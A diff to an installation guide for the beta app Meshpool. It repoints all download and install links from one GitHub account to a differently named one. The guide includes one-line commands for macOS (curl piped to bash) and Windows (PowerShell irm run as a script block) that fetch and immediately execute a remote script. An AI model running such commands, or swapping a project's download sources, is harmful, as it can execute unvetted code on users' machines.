@@ -6,18 +6,18 @@ About five minutes. Meshpool is in beta and is not yet signed by Apple or Micros
 
 | Your computer | How to tell | Download |
 |---|---|---|
-| Mac with Apple silicon (M1, M2, M3, M4) | Apple menu → About This Mac shows **Chip: Apple M…** | [Meshpool.dmg](https://github.com/hamzaaziada/meshpool-harness/releases/latest/download/Meshpool.dmg) |
-| Mac with Intel | About This Mac shows **Processor: … Intel** | [Meshpool-Intel.dmg](https://github.com/hamzaaziada/meshpool-harness/releases/latest/download/Meshpool-Intel.dmg) |
-| Windows 10 or 11 | | [Meshpool-Setup.exe](https://github.com/hamzaaziada/meshpool-harness/releases/latest/download/Meshpool-Setup.exe) |
+| Mac with Apple silicon (M1, M2, M3, M4) | Apple menu → About This Mac shows **Chip: Apple M…** | [Meshpool.dmg](https://github.com/hamzaziada4422/meshpool-harness/releases/latest/download/Meshpool.dmg) |
+| Mac with Intel | About This Mac shows **Processor: … Intel** | [Meshpool-Intel.dmg](https://github.com/hamzaziada4422/meshpool-harness/releases/latest/download/Meshpool-Intel.dmg) |
+| Windows 10 or 11 | | [Meshpool-Setup.exe](https://github.com/hamzaziada4422/meshpool-harness/releases/latest/download/Meshpool-Setup.exe) |
 
-Macs with Apple silicon need macOS 11 Big Sur or later. Intel Macs need macOS 10.15 Catalina or later (on 10.15, Pi, Codex, OpenCode and browser use need macOS 11).
+Macs, Apple silicon and Intel, need macOS 11 Big Sur or later (browser use needs macOS 13).
 
 ## 2. Install on a Mac
 
 **The quickest way: one command, no security prompts.** Open Terminal (press Cmd+Space, type Terminal, press Return), paste this line and press Return:
 
 ```sh
-curl -fsSL https://raw.githubusercontent.com/hamzaaziada/meshpool-harness/main/install.sh | bash -s -- --app
+curl -fsSL https://raw.githubusercontent.com/hamzaziada4422/meshpool-harness/main/install.sh | bash -s -- --app
 ```
 
 It downloads Meshpool into Applications and opens it. Skip to step 4.
@@ -52,7 +52,7 @@ On macOS 14 Sonoma and earlier there is a shorter way for step 4: in Application
 Or with one command in PowerShell (Start → type PowerShell → Enter):
 
 ```powershell
-& ([scriptblock]::Create((irm https://raw.githubusercontent.com/hamzaaziada/meshpool-harness/main/install.ps1))) -App
+& ([scriptblock]::Create((irm https://raw.githubusercontent.com/hamzaziada4422/meshpool-harness/main/install.ps1))) -App
 ```
 
 Pictures of the macOS and Windows prompts are illustrations; the wording on your computer may differ slightly.
@@ -84,4 +84,4 @@ Meshpool tells you when a new version is out. Click the update bar, or open **Se
   ```
 
 - **No Open Anyway button in Privacy & Security:** open Meshpool from Applications once more first; the button appears for about an hour after macOS blocks the app.
-- **Anything else:** click **Report this** next to the error, or the **Beta** badge in the app, or [open an issue](https://github.com/hamzaaziada/meshpool-harness/issues/new/choose).
+- **Anything else:** click **Report this** next to the error, or the **Beta** badge in the app, or [open an issue](https://github.com/hamzaziada4422/meshpool-harness/issues/new/choose).
